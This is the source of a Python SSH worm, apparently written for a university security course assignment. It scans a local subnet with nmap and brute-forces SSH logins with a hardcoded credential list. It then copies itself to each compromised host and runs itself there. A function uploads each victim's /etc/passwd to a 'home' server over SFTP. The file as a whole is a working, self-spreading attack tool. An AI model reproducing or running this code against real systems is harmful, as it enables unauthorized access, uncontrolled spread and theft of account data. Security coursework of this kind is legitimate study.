#!/usr/bin/python

# CPSC 456 - Assignment 1
# Professor Gofman
# Due: 21 October 2016

# Team:
# Micah Geertson - micahgeertson@gmail.com
# Joshua Womack - jdwomack@csu.fullerton.edu

import paramiko
import sys
import socket
import nmap
import fcntl
import struct
import netifaces
import os
import errno

from socket import error


# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('ubuntu', '123456')
]


# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"
HOME_CREDS = ('192.168.1.6', 22, 'ubuntu', '123456')

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem(ssh):
    # DONE:
    # Check if the system as infected. One
    # approach is to check for a file called
    # infected.txt in directory /tmp (which
    # you created when you marked the system
    # as infected).

    try:
        # Create an instance of the SFTP class; used for
        # uploading/downloading files and executing commands
        sftpClient = ssh.open_sftp()

        # Check if the file exists
        sftpClient.stat(INFECTED_MARKER_FILE)
        sftpClient.close()
        print "The system should NOT be infected!"
        return True

    # The file does not exist
    except IOError, e:
        print "The system should be infected!"
        markInfectedAndSpread(sftpClient)
        sftpClient.close()
        return False


#################################################################
# Marks the system as infected
#################################################################
def markInfectedAndSpread(sftpClient):

    # Mark the system as infected. One way to do
    # this is to create a file called infected.txt
    # in directory /tmp/

    # Copy this worm to the remote system
    sftpClient.put("/tmp/passwordthief_worm.py", "/tmp/passwordthief_worm.py")
    sftpClient.put(INFECTED_MARKER_FILE, INFECTED_MARKER_FILE)



###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def executeWorm(sshClient):

    # This function takes as a parameter
    # an instance of the SSH class which
    # was properly initialized and connected
    # to the victim system. The worm will
    # change its permissions to executable,
    # and execute itself.

    # Make the worm file executable on the remote system
    sshClient.exec_command("chmod a+x /tmp/passwordthief_worm.py")

    # Execute the worm
    #sshClient.exec_command("nohup python /tmp/passwordthief_worm.py & 2> /tmp/log.txt")
    sshClient.exec_command("nohup python /tmp/passwordthief_worm.py &")

###############################################################
# Send the /etc/passwd file back to home base
# @param currentIP - Current host IP
# @param HOME_SERVER_CREDS - Creds which allow us to call home
###############################################################
def stealPasswordsAndCallHome(currentIP, HOME_CREDS):
    # If equal, this means we are executing the initial attack
    # and we will not copy /etc/passwd
    if not currentIP == HOME_CREDS[0]:
        # call home
        homeServer = paramiko.SSHClient()
        homeServer.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        homeServer.connect(HOME_CREDS[0], HOME_CREDS[1], HOME_CREDS[2], HOME_CREDS[3])
        # steal passwords
        sftpClient = homeServer.open_sftp()
        sftpClient.put('/etc/passwd', '/home/ubuntu/StolenPasswords/passwd_' + currentIP)
        sftpClient.close()
        homeServer.close()

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, username, password, sshClient):

    # Tries to connect to host host using
    # the username stored in variable userName
    # and password stored in variable password
    # and instance of SSH class sshClient.
    # If the server is down or has some other
    # problem, connect() function which you will
    # be using will throw socket.error exception.
    # Otherwise, if the credentials are not
    # correct, it will throw
    # paramiko.SSHException exception.
    # Otherwise, it opens a connection
    # to the victim system; sshClient now
    # represents an SSH connection to the
    # victim. Most of the code here will
    # be almost identical to what we did
    # during class exercise. Please make
    # sure you return the values as specified
    # in the comments above the function
    # declaration (if you choose to use
    # this skeleton).

    try:
        print "Attacking host: " + host + "...",
        sshClient.connect(host, 22, username, password)
        isInfected = isInfectedSystem(sshClient)
        return 0, isInfected

    except paramiko.ssh_exception.AuthenticationException:
        print "Wrong credentials."
        return 1, None

    except socket.error, v:
        print 'v: ', v
#print ("Username: " + username + " Password: " + password)#The #system is down."
        return 3, None


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def dictAttack(host):

    # The credential list
    global credList

    global ssh
    # Create an instance of the SSH client
    ssh = paramiko.SSHClient()

    # Set some parameters to make things easier.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # The results of an attempt
    attemptResults = None

    # Go through the credentials
    for (username, password) in credList:

        attemptResults, isInfected = tryCredentials(host, username, password, ssh)

        if attemptResults == 0:
            # if host is already infected, return False so this host can be skipped
            if isInfected:
                return False
            else:
                return (ssh, username, password)

    # Could not find working credentials
    return None

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP():

    # DONE:
    # Get all the network interfaces on the system
    networkInterfaces = netifaces.interfaces()

    print networkInterfaces

    # Retrieve and return the IP of the current system
    ipAddr = None

    for netFace in networkInterfaces:
        addr = netifaces.ifaddresses('eth0')[2][0]['addr']

        if not addr == '127.0.0.1':
            ipAddr = addr
            break

    return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():

    # DONE: Add code for scanning
    # for hosts on the same network
    # and return the list of discovered
    # IP addresses.
    portScanner = nmap.PortScanner()

    portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

    hostInfo = portScanner.all_hosts()

    liveHosts = []

    for host in hostInfo:
        if portScanner[host].state() == "up":
            liveHosts.append(host)

    return liveHosts


def main():
    # Get the IP of the current system
    hostIP = getMyIP()

    stealPasswordsAndCallHome(hostIP, HOME_CREDS)

    # Get the hosts on the same network
    networkHosts = getHostsOnTheSameNetwork()

    # Remove the IP of the current system
    # from the list of discovered systems (we
    # do not want to target ourselves!).
    if hostIP in networkHosts:
        networkHosts.remove(hostIP)

    print "My IP: ", hostIP
    print "\nFound hosts: ", networkHosts


    # Go through the network hosts
    for host in networkHosts:

        # Try to attack this host
        sshInfo =  dictAttack(host)
        print 'sshInfo: ', sshInfo


        # Did the attack succeed?
        if sshInfo:

            print "Trying to spread..."

            executeWorm(sshInfo[0])
            print "Spread like butter."
            ssh.close()
            exit()


if __name__ == "__main__":
    main()
